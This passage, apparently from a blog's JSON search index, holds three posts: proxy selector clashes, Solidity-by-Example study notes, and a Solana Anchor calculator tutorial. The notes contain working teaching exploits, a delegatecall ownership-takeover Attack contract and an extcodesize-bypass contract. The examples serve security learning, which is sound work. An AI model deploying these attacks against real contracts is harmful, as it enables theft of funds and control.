2. Function Selector Clashes . Function Selector: A 4 byte hash of a function name and function signature that define a function. . Now it is possible that a function in the implementation contract has the same function selector as an admin function in the proxy contract. Think of a scenario where function getPrice in the implementationContract has the same Function Selector as function destroyProxy. Definitely would not be good. . For example, the following two functions have the exact same function selector . function collate_propagate_storage(bytes16) external{} function burn(uint256) external {} . Contract to verify this statement is as follows and also can be found on this link: https://gist.github.com/saxenism/02af4e7a7fdb42801157571a3dab2c05 . // SPDX-License-Identifier: MIT pragma solidity &gt;=0.7.0 &lt;0.9.0; contract ProxyExperimentation { function getFunctionSignature(string memory signature) internal pure returns (bytes4) { return bytes4(keccak256(bytes(signature))); } function checkFunctionSelectorSimilarity() external pure returns (bool) { bytes4 functionSelector1 = getFunctionSignature(&quot;collate_propagate_storage(bytes16)&quot;); bytes4 functionSelector2 = getFunctionSignature(&quot;burn(uint256)&quot;); bool success = (functionSelector1 == functionSelector2); return success; } function verifyOtherFunctionDisimilarity() external pure returns (bool) { bytes4 functionSelector1 = getFunctionSignature(&quot;collate_propagate_storage(bytes16)&quot;); bytes4 functionSelector2 = getFunctionSignature(&quot;burnn(uint256)&quot;); bool result = (functionSelector1 == functionSelector2); return result; } } . Proxy Patterns . 1. Transparent Proxy Pattern . In this pattern, the admin can call only call the admin functions in the proxy contract and the users can only call the functions in the implementation contract. Admin functions are the functions that govern the upgrades. . This way, as an admin or as a user you can’t mix up functions from different contracts with the same function selector and no problems should occur. As a side note, now the admin cannot participate in their own DeFi protocol :P . 2. Universal Upgradable Proxies . Admin Only functions are kept in the implementation contract itself, instead of the proxy. . The advantage here is, if that happens, and two functions have the same function selector, then the Solidity compiler will let us know. Also, since there is one less read that we have to do, we save on gas costs. . So, it is necessary here that you implement the upgradation functions in the implementation contract, because otherwise you would be stuck and we get back to the YEET method . 3. Diamond Pattern . Allows for multiple implementation contracts. Is probably the best method to implement upgradable contracts, since it allows you to make granular changes/upgrades, but it can get really complex. So to use this, you need to be really really good at smart contract development. .",
            "url": "https://saxenism.com/web3/solidity/security/proxy/upgradation/2022/04/30/All-About-Proxies.html",
            "relUrl": "/web3/solidity/security/proxy/upgradation/2022/04/30/All-About-Proxies.html",
            "date": " • Apr 30, 2022"
        }
        
    
  
    
        ,"post14": {
            "title": "Solidity-By-Example",
            "content": "General . Solidity supports if, else and else if statements. . | Ternary operators are also supported. . | for, while and do while loops are supported. But anything apart from for is rarely used. . | 4.Arrays . uint[] public arr = [1,2,3]; uint[] public arr; uint[10] public fixedSizeArr; // Solidity can also return entire arrays returns(uint[] memory) // Creating an array in memory. Only fixed sized arrays can be created function createArray() public { uint[] memory arr = new uint[](5); } // Deleting an array element can be done in two ways: // 1. Maintain array order: Shift all elements post deleted element one place left and pop last element // 2. Do not maintain array order: Copy last element to the deleted index. Pop the last element. . Enums | enum Status { Pending, Accepted, EnRoute, Delievered, Cancelled, Refunded } Status public status; // Default status is 0, ie, Pending status = Status.Cancelled; // Setting the status to Cancelled delete status; // Resets the status to 0, ie, Pending // A good practice would be to declare all the enums in your project inside a single file and then import that file // in different files where the enums are to be used. . A maximum of three parameters can be indexed in an event. Indexing helps to sort the given parameter while filtering the logs. . | To call the parent contracts, either do parentContract.foo() or use the super keyword. . | Using super would call all of the immediate parent contracts. . Interfaces have no state variables, no constructors and no function implementations | All functions have to be external and interfaces can inherit. . You can name your function parameters. Like address owner instead of address. . The recommended method for sending Ether is call in combination with re-entrancy guard. | /* Which function is called, fallback() or receive()? send Ether | msg.data is empty? / yes no / receive() exists? fallback() / yes no / receive() fallback() */ _to.transfer(msg.value); bool sent = _to.send(msg.value); (bool sent, bytes memory data) = _to.call{value: msg.value}(&quot;&quot;); . Also, fallback function cannot take any arguments and cannot return anything. . fallback is called when a function that does not exist is called or some Ether is sent without msg.data or recieve function does not exist. . | Calling other functions with the low-level call . | (bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(abi.encodeWithSignature(&quot;foo(string,uint256)&quot;, &quot;call foo&quot;, 123)); . delegatecall is similar to call but the difference is if contract A delegates a call to contract B, then the function code of contract B is executed with the storage, msg.sender and msg.value of contract A itself. | 13. . function transfer(address _addr, uint256 _amt) { // something } . abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;); . and . bytes4 public transferSelector = bytes4(keccak256(bytes4(&quot;transfer(address,uint256)&quot;))); . Same energy . | Constant vs Immutable . Both immutable and constant are keywords that can be used on state variables to restrict modifications to their state. The difference is that constant variables can never be changed after compilation, while immutable variables can be set within the constructor. . pragma solidity &gt;0.6.4 &lt;0.7.0; contract C { uint constant X = 32**22 + 8; string constant TEXT = &quot;abc&quot;; bytes32 constant MY_HASH = keccak256(&quot;abc&quot;); uint immutable decimals; uint immutable maxBalance; address immutable owner = msg.sender; constructor(uint _decimals, address _reference) public { decimals = _decimals; // Assignments to immutables can even access the environment. maxBalance = _reference.balance; } function isBalanceTooHigh(address _other) public view returns (bool) { return _other.balance &gt; maxBalance; } } . Compared to regular state variables, the gas costs of constant &amp; immutable variables are much lower. . a) For a constant variable, the expression assigned to it is copied to all the places where it is accessed and also re-evaluated each time. This allows for local optimizations. . Reevaluated each time means: If you have something like, uint area = 2 * PI * 5; This will get reevaluated to the exact value at time of pasting the value of PI here. . b) Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed. For these values, 32 bytes are reserved. . -&gt; Due to this, constant values can sometimes be cheaper than immutable values. . Inheritence . Function that is going to be overriden, must be declared as virtual and the function that will override a parent function must use the keyword override . | The order of inheritence in a new contract should go from most-base-like to most-derived. . | Contracts can inherit from multiple parent contracts. When a function is called that is defined multiple times in different contracts, parent contracts are searched from right to left, and in depth-first manner. . | Shadowing Inherited State Variables . contract Parent { uint256 public pi = 314; } contract Child is Parent { // uint256 public pi = 31419; // Would fail // pi = 314159; // Would also fail constructor() { pi = 314159; } } . Wei and Ethere . Just as 1 ether == 1e18, 1 wei == 1 . Gas . Price paid in Ether = Gas Price * Gas spent . Gas Price is the amount of Ether you are willing to pay per gas. Usually denoted in gwei, which is equal to 1e9. . Gas Spent is the total number of gas spent while doing all the operations required in a particular txn. . Unused gas is refunded. . Two caps of gas: . Block gas limit | gas limit (that is set by you, ie the maximum gas you are willing to pay for a particular transaction) | Hacks . Bypass contracrt code size check . If a contract implements a function to check the code-size of a particular address, it will write a function similar to this: . function isContract(address addr) public returns(bool) { uint32 codeSize; assembly { codeSize := extcodesize(addr) } return codeSize &gt; 0; } . But if this function is called by a contract from its constructor, we can bypass this check. Consider this example: . contract Attacker { bool public isContract; constructor(address _target) { isContract = Target(_target).isContract(address(this)); require(!isContract); } } . Signature Replay Attack . Signing messages off chain and then having a contract that requires that signature before executing a function is a useful technique. . Vulnerability is that the same signature can be used again and again to execute a function. . The ECDSA or the Elliptic Curve Digital Signature Algorithm signatures can be recovered or managed using the ECDSA utility of OZ. These are often generated using the web3.eth.sign function and are 65 byte array (of type bytes in Solidity) arranged in the following way: [[v(1)],[r(32)],[s(32)]] The data signer can be recovered with ECDSA. . The following code snippet shows how to prevent the signature replay attack: . //SPDX-License-Identifier: MIT pragma solidity 0.8.14; import &quot;github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol&quot;; contract ReplayAttack { using ECDSA for bytes32; address[2] public owners; mapping(bytes32 =&gt; bool) public executed; constructor(address[2] memory _owners) payable { owners = _owners; } function deposit() external payable {} function transfer(address _to, uint256 _amount, uint256 _nonce, bytes[2] memory _sigs) external { bytes32 txHash = getTxHash(_to, _amount, _nonce); require(!executed[txHash], &quot;Already Executed&quot;); require(_checkSigs(_sigs, txHash), &quot;invalid sigs&quot;); executed[txHash] = true; (bool sent, ) = _to.call{value: _amount}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); } function getTxHash(address _to, uint256 _amount, uint256 _nonce) public view returns(bytes32) { return (keccak256(abi.encodePacked(address(this), _to, _amount, _nonce))); } function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash) private view returns(bool) { bytes32 ethSignedHash = _txHash.toEthSignedMessageHash(); for(uint i = 0; i &lt; _sigs.length; i++) { address signer = ethSignedHash.recover(_sigs[i]); bool valid = signer == owners[i]; if(!valid) { return false; } } return true; } } . block.timestamp manipulation . Don’t use block.timestamp as a source of entropy and/or random number. . The miners can manipulate the block.timestamp with the following two constraints: . Block cannot be stamped with a time earlier than it’s parent | Cannot be too far out in the future. | Front Running . Transactions take some time before they are mined. . Transactions not yet mined are put in a transaction pool. . Since transactions with a higher gas price are typically mined first, an attacker who might be watching the mempool, may spot an opportunity to get their own txn included in a block before someone else (might be winning a game, swapping a highly illiquid asset etc) and get significant economical incentives. . Solution: . Use the commit-reveal-distribute scheme when games are involved. | Use submarine send. | Hiding malicious code with external contracts . // SPDX-License-Identifier: MIT pragma solidity 0.8.13; contract A { uint256 public testVar; // public will create an automatic getter function } contract B { uint256 public testVar = 10; } contract ProblematicTypecasting { function viewTestVar(address _addr) public view returns(uint256) { A(_addr).testVar(); // Will return 0 or 10 based on whether we pass the deployed address of contract A or B. } } . Phishing with txn.origin . Use msg.sender . delegatecalls . delegatecalls preserves context . example: . What happened? Eve called Attack.attack(). Attack called the fallback function of HackMe sending the function selector of pwn(). HackMe forwards the call to Lib using delegatecall. Here msg.data contains the function selector of pwn(). This tells Solidity to call the function pwn() inside Lib. The function pwn() updates the owner to msg.sender. Delegatecall runs the code of Lib using the context of HackMe. Therefore HackMe&#39;s storage was updated to msg.sender where msg.sender is the caller of HackMe, in this case Attack. */ contract Lib { address public owner; function pwn() public { owner = msg.sender; } } contract HackMe { address public owner; Lib public lib; constructor(Lib _lib) { owner = msg.sender; lib = Lib(_lib); } fallback() external payable { address(lib).delegatecall(msg.data); } } contract Attack { address public hackMe; constructor(address _hackMe) { hackMe = _hackMe; } function attack() public { hackMe.call(abi.encodeWithSignature(&quot;pwn()&quot;)); } } . Another slightly more sophisticated example . // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; /* This is a more sophisticated version of the previous exploit. 1. Alice deploys Lib and HackMe with the address of Lib 2. Eve deploys Attack with the address of HackMe 3. Eve calls Attack.attack() 4. Attack is now the owner of HackMe What happened? Notice that the state variables are not defined in the same manner in Lib and HackMe. This means that calling Lib.doSomething() will change the first state variable inside HackMe, which happens to be the address of lib. Inside attack(), the first call to doSomething() changes the address of lib store in HackMe. Address of lib is now set to Attack. The second call to doSomething() calls Attack.doSomething() and here we change the owner. */ contract Lib { uint public someNumber; function doSomething(uint _num) public { someNumber = _num; } } contract HackMe { address public lib; address public owner; uint public someNumber; constructor(address _lib) { lib = _lib; owner = msg.sender; } function doSomething(uint _num) public { lib.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num)); } } contract Attack { // Make sure the storage layout is the same as HackMe // This will allow us to correctly update the state variables address public lib; address public owner; uint public someNumber; HackMe public hackMe; constructor(HackMe _hackMe) { hackMe = HackMe(_hackMe); } function attack() public { // override address of lib hackMe.doSomething(uint(uint160(address(this)))); // pass any number as input, the function doSomething() below will // be called hackMe.doSomething(1); } // function signature must match HackMe.doSomething() function doSomething(uint _num) public { owner = msg.sender; } } .",
            "url": "https://saxenism.com/web3/solidity/solidity-by-example/language-tricks/beginner/2022/03/09/Mental-Hooks-SBE.html",
            "relUrl": "/web3/solidity/solidity-by-example/language-tricks/beginner/2022/03/09/Mental-Hooks-SBE.html",
            "date": " • Mar 9, 2022"
        }
        
    
  
    
        ,"post15": {
            "title": "Solana Anchor Tutorial: Build a Calculator ",
            "content": "Solana development 101: Building a calculator using Solana programs . Welcome to the Solana crypto-currency quest. With this quest you’ll get upto speed with the most rapidly rising blockchain in the market: Solana. It would be awesome if you know a bit of Rust (or even C++ concepts) already and are familiar with how blockchains work, but even if you do not have any specific background of Rust or Solana development, we will have all bases covered. If you have a high level of interest and motivation, we should be good to go ahead. . In this quest, we will be developing a simple calculator on the Solana blockchain. This essentially means that once you are done with this quest, you will be well versed with the basics of development on the Solana blockchain using the Anchor framework and would be much better equipped to take on the other Solana quests. . Setting up the Environment: . There are a few things that we need to get up and running before we move forward in this quest. Before we move forward make sure you’ve a working NodeJS environment set up. We need rust, Solana, Mocha(a JS testing framework), Anchor and Phantom wallet for this quest. To install rust, run . curl --proto &#39;=https&#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh source $HOME/.cargo/env rustup component add rustfmt . To install Solana, run . sh -c &quot;$(curl -sSfL https://release.solana.com/v1.8.0/install)&quot; . To install mocha globally, run . npm install -g mocha . Now we’ll be installing Anchor. If you’re on a linux system, run . # Only on linux systems npm i -g @project-serum/anchor-cli . Fair Warning : If you are using a Windows system, we highly suggest using WSL2 (Windows sub-system for Linux) or switching to a Linux environment. Setting up WSL is also quick and easy. A good walk-through can be found here For any other OS, you need to build from source. Run the following command . cargo install --git https://github.com/project-serum/anchor --tag v0.17.0 anchor-cli --locked . To verify that Anchor is installed, run . anchor --version . . Since Solana is still a pretty new blockchain compared to the establised ones out there, it’s developer tooling too is pretty limited and cumbersome as of now. However, it is rapidly improving and it does so on a daily basis. At the forefront of this development is Anchor, by Armani Ferrante. You can think of it like the Ruby on Rails framework for Ruby, that means yes, you can develop things on vanilla Ruby, but Ruby on Rails makes your life much much easier, right? That’s the same with Anchor and Solana development. Anchor is the Hardhat of Solana development plus much more. It offers a Rust DSL (basically, an easier Rust) to work with along with IDL, CLI and workspace management. Anchor abstracts away a lot of potential security holes from a conventional Solana program, takes care of the serialization and deserialization, reduces large boilder-platey code to macros and lot of other good good stuff. . Running configurations on Solana CLI . The first command you should run on your terminal (assuming Solana CLI was properly installed in the last quest) is: . solana config get . This should throw up a result similar to something like: . . If you didnot set up your keypair earlier, then you won’t be having the Keypair Path in your results. To set that up, follow the instructions over here . We would want to remain on the local network for building our program and later shift to the devent or mainnet-beta if required. If the RPC URL field of your last result did not show localhost, you can set it to localhost using the following command: . solana config set --url localhost . Next, we would want to know our account/wallet address and airdrop some SOL tokens into it, to handle all the deployment, transactions etc costs that come with interacting with and using a Solana program. To do that first let’s find our address. The command to do that is: . solana address . This would result into something like this: . . Then, for more comprehensive details of your account, use the following command with the address that you got from the last command . solana account &lt;your address from the last command&gt; . This would result into something like this: . . Next, we want to spin up our local network. Think of this local network as a mock Solana blockchain running on your own single system. This network would be required for development and testing of our program. To spin it up, in a separate tab, use the following command: . solana-test-validator . Once you get an image, like the one below, you know that your local validator (local network) is now up and running . . Now, our last task is to top up our account with some SOL, which you can do by using: . solana airdrop 100 . This should result in something like: . . Setting up our Anchor project . In this sub-quest all we would do is initialize an Anchor project and see whether everything’s there and working fine or not and after move on ahead to make our own changes. Head over to your preferred destination for the project using your terminal and then type the following command: . anchor init mymoneydapp cd mycalculatordapp . This would result in a screen somewhat similar to this: . . First we check whether we can see the programs, app, programs, migrations directory among others or not. If we can, we would head over to programs/messengerapp/src/lib.rs to see the default program that Anchor provides us. This is the most basic example possible on Anchor and what’s happening here is simply that a user-defined function Initialize whenever called would successfully exit the program. That’s all, nothing fancy. Now, let’s try to compile this program using the following command: . anchor build . This would trigger a build function and would something like this upon completion: . . This build creates a new folder in your project directory called, target. This target folder contains the idl directory, which would also contain the idl for our program. The IDL or Interface Description Language describes the instructions exposed by the contract and is very similar to ABI in Solidity and user for similar purposes, ie, for tests and front-end integrations. Next, we can move onto testing this program, so that we can get familiar with how testing is done in Anchor. Head to tests/messengerapp.js. Here, you’ll see a test written in javascript to interact and test the default program. There are a lot of things in the test, that may not make sense to you right now, but stick around and we’ll get to those shortly. The test would look something like this: . . Next, to actually run these tests, first head over to the tab where you ran the solana-test-validator command and kill that process (using Ctrl-C). Now, use the following command: . anchor test . The passing tests should result in the following screen: . . Now, let’s head over to the programs directory and start importing some cool Rust crates provided by Anchor which will help us build our calculator app. . Defining our programs . Head over to programs/mycalculatordapp/src/lib.rs and clear the code written there apart from the boilerplate code written over there. After clearing, your coding screen should look something like this: . . You can also copy paste the below code to get started (assuming that you’ve also named your project as mycalculatordapp) . use anchor_lang::prelude::*; declare_id!(&quot;Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS&quot;); #[program] pub mod mycalculatordapp { use super::*; } . Now let us simply define the function signatures that we will require to code up our calculator dapp without writing the logic yet. The bulk of the program goes in a module under the #[program] macro. We’ll just define them under the pub mod mycalculatordapp and write the logic later. These function definitions would look like this: . pub fn create(ctx:Context&lt;Create&gt;, init_message: String) -&gt; ProgramResult { } pub fn add(ctx: Context&lt;Addition&gt;, num1: i64, num2: i64) -&gt; ProgramResult { } pub fn multiply(ctx: Context&lt;Multiplication&gt;, num1: i64, num2: i64) -&gt; ProgramResult { } pub fn subtract(ctx: Context&lt;Subtraction&gt;, num1: i64, num2: i64) -&gt; ProgramResult { } pub fn divide(ctx: Context&lt;Division&gt;, num1: i64, num2: i64) -&gt; ProgramResult { } . Here pub means public and fn means function, implying that they are public functions that can be invoked from our program, ie it becomes a client-callable program function. The first argument of these functions is always Context&lt;T&gt; which consist of the solana accounts array and the program ID, which in essence is the required data to call just about any progarm on Solana. The next parameter of both the first function is a String named init_message, which we will be using as our message that is stored on our calculator (think how you see some text every time you boot up your phone, pc, calculator etc). In the other functions, the num1 and num2 parameters are of type integers and are the numbers on which we will be performing our mathematical operations. The ProgramResult is the return type of both these functions, which actually is just an easier method to serve function results and/or errors. . After defining the above functions, your code should look something like this: . . Writing the logic for our first Solana program . Now let’s write the logic for the create function first, ok? Let’s first make our intentions clear for this function and the program in general. We want to keep track of three things here. First is the greeting message that we would be storing in our calculator, the second would be the result of all the mathematical operations and third is the remainder, which will be used in case of division, since Anchor currently does not support floating values. So we would want our calculator account (the main account that will handle all the calculation stuff of the program) to have three fields, namely: greeting, result, remainder. Also, since the same account will be used for the calculations and with different parameteres, we would want the calculator account to be mutable, ie, to be able to persist changes. Write the following code logic inside the create function now. . let calculator = &amp;mut ctx.accounts.calculator; calculator.greeting = init_message; Ok(()) . The Ok(()) syntax is used for error handling of the ProgramResult type. You can think of Ok(()) like a gate, that lets the program continue if there are no errors but sends the program into another state if an error is encountered. . Now, your coding screen should look something like this: . . A small note about accounts on Solana . An account is not actually a wallet. Instead, it’s a way for the contract to persist data between calls. This includes information such as the count in our base_account, and also information about permissions on the account. Accounts pay rent in the form of lamports, and if it runs out, then the account is purged from the blockchain. Accounts with two years worth of rent attached are “rent-exempt” and can stay on the chain forever. . Defining the structure of calculator account . In the last sub-quest, we talked about what is our expectation with the calculator account, right? Also, we used the calculator account already in the create function. So, now let’s go ahead and define what actually our calculator account is. As mentioned earlier, everything on Solana is an account, so we will be using the awesome macros of Anchor to convert a struct into our calculator account. . Write the code provided below outside of pub mod mycalculatordapp. . #[account] pub struct Calculator { pub greeting: String, pub result: i64, pub remainder: i64, } . With this, your code screen would look something like this: . . Good, now you are on track to implement actual functionalities of a calculator. Let’s see how do we do that. . First calculation function logic . With the last sub-quest, we are all set to write the logic for our first calculation function. Let’s write the logic for addition first. As you might be thinking, here we simply have to save the result of the addition of the two parameters in the result field of the calculator account. If you were thinking along that lines, then congratulations, you’re right on the money. Write the following code inside of the add function . let calculator = &amp;mut ctx.accounts.calculator; calculator.result = num1 + num2; Ok(()) . With this, your coding screen would look something like this: . Notice the Context&lt;Addition? As discussed earlier, it is the list of accounts that must be passed to this particular function for it to run. What accounts do you think would we require to send to this function to make it work? Yes, correct, we only need to send the calculator account, nothing else xD. So, now with this knowledge, let’s define Addition, write the following code below with your declaration of the calculator account: . #[derive(Accounts)] pub struct Addition&lt;&#39;info&gt; { #[account(mut)] pub calculator: Account&lt;&#39;info, Calculator&gt;, } . With this, your coding screen would look something like this: . . Congratulations…. now you have a Solana blockchain program that is capable of adding two number…. How cool is that, right? Now I want you to take a pause and re-collect whatever you’ve learnt in the quest uptil now, because the next sub-quest is going to be a challenge sub-quest :D . Challenge sub-quest . This sub-quest is a challenge for you. Trust me, at this moment, you are perfectly capable to write more Solana code by yourself. Keep in mind how we defined the add function and the Addition struct in the last quest and with that knowledge, I want you all to write the code for all the remaining functions, that is, multiply, subtract and divide and then declare the corresponding structs, that is Multiplication, Subtraction and Division. . The only function that will be slightly different would be the divide function, so trust in yourself and give this sub-quest your best shot. . Solution to the challenge sub-quest . I hope that you did your best to try and complete the remaining functions, now you can tally them with the below code. . The code for the multiply function is as follows: . let calculator = &amp;mut ctx.accounts.calculator; calculator.result = num1 * num2; Ok(()) . The Multiplication struct would look something like this: . #[derive(Accounts)] pub struct Multiplication&lt;&#39;info&gt; { #[account(mut)] pub calculator: Account&lt;&#39;info, Calculator&gt;, } . The code for the subtract function is as follows: . let calculator = &amp; mut ctx.accounts.calculator; calculator.result = num1 - num2; Ok(()) . The code for Subtraction struct is as follows: . #[derive(Accounts)] pub struct Subtraction&lt;&#39;info&gt; { #[account(mut)] pub calculator: Account&lt;&#39;info, Calculator&gt;, } . And finally, the code for the divide function is as follows: . let calculator = &amp;mut ctx.accounts.calculator; calculator.result = num1 / num2; calculator.remainder = num1 % num2; Ok(()) . The Division struct also looks like this . #[derive(Accounts)] pub struct Division&lt;&#39;info&gt; { #[account(mut)] pub calculator: Account&lt;&#39;info, Calculator&gt;, } . With all this, your coding screen should look something like this: . . . Did you get them right, or most of them right or even one right? Wasn’t this exciting? You’re able to write Solana code yourself right off the bat. . Now, is our program complete? Sadly no, there is one more, last remaining piece of the puzzle that we must address before we can say that we done with the program coding part. Before jumping onto the next sub-quest, try and guess what could we be missing from our program, and yes, you can guess that. It is within your grasp. . Final piece of the puzzle . If you could guess that we had used the Create struct in the first create function itself but never defined it anywhere like we defined the Addition, Multiplication etc structs, then, congratulations you were absolutely right. . With this struct, we want to pass three accounts, the first is obviously the calculator account, since it is being used in the function itself. The second account is the user account and the third account is the system_program. What makes this struct a bit more special is that, in this struct we have to give the command to actually create the calculator account (which we have used in the subsequent functions). The creation of this calculator account will cost us some money (SOL) which will be paid by the user account that we just mentioned, along with that we have the space parameter where we specify how much space do we require in our account (here, calculator account) and finally the system_program is just system specifications for the Solana blockchain, again in the form of an account. . Write the following code to define the Create struct: . #[derive(Accounts)] pub struct Create&lt;&#39;info&gt; { #[account(init, payer = user, space = 8 + 64 + 64 + 64 + 64)] pub calculator: Account&lt;&#39;info, Calculator&gt;, #[account(mut)] pub user: Signer&lt;&#39;info&gt;, pub system_program: Program&lt;&#39;info, System&gt;, } . As discussed earlier, we used the derive Accounts macro since we had to incorporate 3 accounts here and for all these three accounts individually, we used the account macro. Now onto the arguments used with these macros. The init macro is used to create a new account owned by the current program which is our mycalculatordapp program. Whenever init parameter is used, we must always specify the payer or the account that will be paying for creation of the account on the Solana blockchain, along with the space param which is the space with which the new account is created. . The mut parameter marks an account as mutable, which essentially means our account will be altered and Solana will need to update the data in your account. So, always use the mut parameter for persisting changes. . Another new concept used here is the Signer type. This is used to enforce the constraint that the authority account (messengerapp in this case) signed the transaction. . With this, your coding screen should look something like this: . . Further reading: . You can read up on different types of account constraints here. . Testing our calculator program . Head over to tests/mycalculatordapp.js and delete everything that’s written there. We are going to be writing our tests from scratch. The first step would be to import the necessary libraries and constants. To do that, use the following code: . const assert = require(&#39;assert&#39;); const anchor = require(&#39;@project-serum/anchor&#39;); const { SystemProgram } = anchor.web3; . Now, since we will be using Mocha for testing our programs, we will create the skeleton of where we will be putting our tests. So, basically, how Mocha works is that it takes describe blocks as testing blocks and within those describe blocks there are numerous tests written using the it blocks. So, use the following code to create the skeleton: . describe(&#39;mycalculatordapp&#39;, () =&gt; { const provider = anchor.Provider.local(); anchor.setProvider(provider); const calculator = anchor.web3.Keypair.generate(); const program = anchor.workspace.Mycalculatordapp; it(&#39;Creates a calculator&#39;, async () =&gt; { }); it(&quot;Adds two numbers&quot;, async function() { }); it(&#39;Multiplies two numbers&#39;, async function() { }) it(&#39;Subtracts two numbers&#39;, async function() { }); it(&#39;Divides two numbers&#39;, async function() { }); }); . With this, your code screen should look something like this: . . The additional things that we coded there were the introduction of provider. The provider is the abstraction of a connection to the Solana network. In the test, the Anchor framework will create the provider for us based on the environment (anchor.Provider.local()). . Now, the program is an abstraction that combines the Provider, idl, and the programID (which is generated when the program is built) and allows us to call RPC methods against our program. . The calculator variable you see is the keypair generated using anchor.web3 that we will be using to test our program. . When we have these three things, we can start calling functions in our program, which is what we will be doing in our next sub-quest. . Writing our first test . The method to call the functions of our program is pretty straight-forward. We will use the program RPCs (Remote procedure calls) to access the function and then we will use the web3.js library to create accounts which have to be passed as the parameters to those functions. Let’s first jump into the code of our first test and see things in action. . it(&#39;Creates a calculator&#39;, async () =&gt; { await program.rpc.create(&quot;Welcome to Solana&quot;, { accounts: { calculator: calculator.publicKey, user: provider.wallet.publicKey, systemProgram: SystemProgram.programId, }, signers: [calculator] }); const account = await program.account.calculator.fetch(calculator.publicKey); assert.ok(account.greeting === &quot;Welcome to Solana&quot;); _calculator = calculator; }); . Now, what we have done in the code above is simply create a calculator account by generating a new account using the web3 library. Then using the program RPC, we have called the create function and to that function we have supplied the required parameters, which were the calculator, user, systemProgram and the init_message string. . After this function is run, we simply grabbed hold of the calculator account and checked it’s greeting field and verify whether it has changed to Welcome to Solana or not. After that we save the calculator account in a variable called _calculator so that it can be referenced later. . With this, your code screen would look something like this: . . Writing our second test . With this second test, we begin testing the calculations of the Solana program that we wrote. Firstly, we will write the test for the correct functioning of the add function and then with that as the inspiration, the next sub-quest will be a challenge sub-quest where the learner will write the tests for multiply, subtract and divide. For testing, we cannot directly use numbers and we will therefore have to cast them into Anchor big numbers. Now, write the code below to test the add function of our mycalculatordapp program. . it(&quot;Adds two numbers&quot;, async function() { const calculator = _calculator; await program.rpc.add(new anchor.BN(2), new anchor.BN(3), { accounts: { calculator: calculator.publicKey, }, }); const account = await program.account.calculator.fetch(calculator.publicKey); assert.ok(account.result.eq(new anchor.BN(5))); assert.ok(account.greeting === &quot;Welcome to Solana&quot;); }); . It is very similar to the test we wrote in the last sub-quest with the only changes being that we are supplying 2 and 3 as the numbers to be added and passing the list of accounts as per the Addition struct which requires only the calculator account. After the add function is run using the RPC, we fetch the calculator account and check the fields of the calculator account. The greeting field should remain unaffected and still be “Welcome to Solana”, along with that the result field should now be equal to the sum of 2 and 3, ie, 5. . That is all that was required to test the add function. With this, your coding screen should look like this: . . Challenge sub-quest . As discussed in the previous sub-quest, in this sub-quest you are required to come up with the tests for the multiply, subtract and divide functions by yourself. You can take inspiration from the earlier two tests we wrote and trust me when I say that you can very easily write the tests for these three functions too. All you need to do is make sure that the entire quest uptil this point was clear to you. . All the best. . Solution to the challenge sub-quest . I hope that you gave your best attempt to the challenge in the last sub-quest and now let’s tally what you’ve written with the tests can be. The values of the parameters (num1 and num2) being passed can change, make sure you are writing your assert statements accordingly. . Here’s the code for the multiply function check: . it(&#39;Multiplies two numbers&#39;, async function() { const calculator = _calculator; await program.rpc.multiply(new anchor.BN(2), new anchor.BN(3), { accounts: { calculator: calculator.publicKey, }, }); const account = await program.account.calculator.fetch(calculator.publicKey); assert.ok(account.result.eq(new anchor.BN(6))); assert.ok(account.greeting === &quot;Welcome to Solana&quot;); }) . Here’s the code for the subtract function check: . it(&#39;Subtracts two numbers&#39;, async function() { const calculator = _calculator; await program.rpc.subtract(new anchor.BN(32), new anchor.BN(33), { accounts: { calculator: calculator.publicKey, }, }); const account = await program.account.calculator.fetch(calculator.publicKey); assert.ok(account.result.eq(new anchor.BN(-1))); assert.ok(account.greeting === &quot;Welcome to Solana&quot;); }); . Here’s the code for the divide function check: . it(&#39;Divides two numbers&#39;, async function() { const calculator = _calculator; await program.rpc.divide(new anchor.BN(10), new anchor.BN(3), { accounts: { calculator: calculator.publicKey, }, }); const account = await program.account.calculator.fetch(calculator.publicKey); assert.ok(account.result.eq(new anchor.BN(3))); assert.ok(account.remainder.eq(new anchor.BN(1))); assert.ok(account.greeting === &quot;Welcome to Solana&quot;); }); . Wasn’t this exhilarating? You’ve only just started with Solana development and now not only can you just write program functions on your own, you can also write tests to verify their functioning. Isn’t this seriously mind-blowing? Anyway, congratulations on this feet and just tally your code with the code snapshot below and after which we move onto actaully running these tests. . . . . Running the tests . Now, that we are done running all the tests, make sure that your local validator is not running. That means make sure that the solana-test-validator process is not running and the network is set as localhost by inspecting the results of solana config get. Once all this is done, it is time for us to actually test the progarm that we wrote. To do that use the following command: . anchor test . If all the tests pass, you’ll get a screen similar to this: . . If you get some errors, try debugging those using the error messages you get. Make sure you have accurately followed the code presented in the quests and you are on the same Anchor version as that followed in the quest (0.17.0). With that you’ll find your way out of most of the errors that you might run into. . Congratulations . Congratulations on succesfully creating your own calculator on the Solana blockchain and testing its functioning :D . Next steps . Now you’ve dipped your toes in the ocean of Solana development. To learn more about it, you can try and mess around with the data types that we used in the function declarations and see what effect does that have on the program; you can try to use just one struct in place of the Addition, Multiplication, Subtraction and Division struct since they were all similar. You can try to combine all the four calculator functions into one function where the operation is decided using the parameter passed, and apart from this you can experiment with the contents of this quest to your heart’s content and then you can move onto the other quests on Solana development. .",
            "url": "https://saxenism.com/solana/anchor/tutorial/web3/2021/11/28/Solana-Tutorial-Build-A-Calculator.html",
            "relUrl": "/solana/anchor/tutorial/web3/2021/11/28/Solana-Tutorial-Build-A-Calculator.html",
            "date": " • Nov 28, 2021"
        }
        
    
  
    
        ,"post16": {
            "title": "Solana Anchor Tutorial: Build a Messaging App ",
